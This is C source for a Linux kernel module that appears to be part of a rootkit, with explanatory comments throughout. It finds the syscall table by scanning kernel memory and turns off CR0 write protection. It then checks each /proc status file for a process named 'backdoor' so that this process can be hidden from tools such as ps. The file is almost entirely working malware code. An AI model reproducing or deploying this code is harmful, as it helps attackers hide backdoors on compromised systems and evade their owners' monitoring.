#include <linux/module.h>
#include <linux/slab.h> //kmalloc()
# include <linux/syscalls.h>

#define SECRET_PROCESS "backdoor"

unsigned long ** get_sys_call_table_by_entry_SYSCALL_64(void) {
    u64 reg_lstar, i;
    void * sys_call_table = NULL;
    // Register MSR_LSTAR contains the address of system_call handler.
    rdmsrl(MSR_LSTAR, reg_lstar);
    for (i = 0; i <= PAGE_SIZE; ++i) {
        u8 *tmp_addr = (u8 *) reg_lstar + i;
        /* 
        Search the system call machine code, hard coded.
         * call disp32(,%rax,8) ==> FF 14 C5
         * 1) FF 14 C5 is the machine code of entry_SYSCALL_64
         * 2) disp32 is exactly SCT's address. 
         */
        if (tmp_addr[0] == 0xff && tmp_addr[1] == 0x14 && tmp_addr[2] == 0xc5) {
            sys_call_table = tmp_addr + 3;
            // extend for 64-bit.
            return (void *)(0xffffffff00000000 | *(u32 *)sys_call_table);
        }
    }
    return NULL;
}

unsigned long ** get_sys_call_table_by_sys_close(void) {
    unsigned long **sys_call_table = (unsigned long **)PAGE_OFFSET; //PAGE_OFFSET is the start of the kernel address
    while ((unsigned long)sys_call_table < ULONG_MAX) {
        // We brute force the whole kernel space and try to match an exported function's value (here is sys_close) to find the right position of syscall table entry
        if (sys_call_table[__NR_close] == (unsigned long *)sys_close) {
            return sys_call_table;
        }
    sys_call_table ++;
    }
    return NULL;
}

unsigned long ** get_sys_call_table(void) {
    return get_sys_call_table_by_entry_SYSCALL_64();
    //return get_sys_call_table_by_sys_close();
    //from v4.14 sys_close is not exported anymore, though it still can success in our environment.
}

void disable_write_protection(void) {
    unsigned long reg_cr0 = read_cr0();
    clear_bit(16, &reg_cr0);
    write_cr0(reg_cr0);
}

void enable_write_protection(void) {
    unsigned long reg_cr0 = read_cr0();
    set_bit(16, &reg_cr0);
    write_cr0(reg_cr0);
}

int get_pid_len(char *d_name) {
    char *s;
    int len = 0;
    for (s = d_name + strlen(d_name) - 1; s >= d_name; --s) {
        if (*s < '0' || *s > '9') return -1;
	    else len++;
    }
    return len;
}

int if_need_filter(char *d_name) {
    int is_needed = 0, pid_len = get_pid_len(d_name);
    char *file_path = NULL;
    mm_segment_t fs; // to bypass the check so we can open a user space file in kernel mode
    loff_t f_pos; // is actually long long
    char *buf = NULL; //to store the name we find from status file
    struct file* fp = NULL; // used by flip_file()

    if (pid_len < 0) {
        //this is not called by ps
        goto out;
    }
    buf = (char *)kmalloc(128, GFP_KERNEL);
    file_path = (char *)kmalloc(pid_len + 14, GFP_KERNEL);

    snprintf(file_path, pid_len + 14, "/proc/%s/status", d_name);
    printk("%s\n", file_path);
    //filp_open — open file and return file pointer, from: https://docs.huihoo.com/linux/kernel/2.6.26/filesystems/re76.html
    //the 3rd argument: ignored unless O_CREAT is set
    fp = filp_open(file_path, O_RDONLY, 0);
    if (IS_ERR(fp)) {
        printk("file open failed, file path: %s\n", file_path);
        goto out;
    }
    /* 
    * The fs value determines whether argument validity checking should be 
    * performed or not. If get_fs() == USER_DS, checking is performed, with 
    * get_fs() == KERNEL_DS, checking is bypassed. 
    * 
    * For historical reasons, these macros are grossly misnamed. 
    */ 
   //from source code /arch/x86/include/asm/uaccess.h
   //Because now we need to read a user mode file from kernel.
    fs = get_fs();
    set_fs(KERNEL_DS);
    //pos field indicates the current file position like lseek
    //status file's first line should contain the process's name.
    f_pos = 0;
    vfs_read(fp, buf, 128, &f_pos);
    if (strstr(buf, SECRET_PROCESS)) {
        is_needed = 1;
        printk("read: %s\n", buf);
    }
    set_fs(fs);
    filp_close(fp, NULL);
out:
    kfree(file_path);
    kfree(buf);
    return is_needed;
}
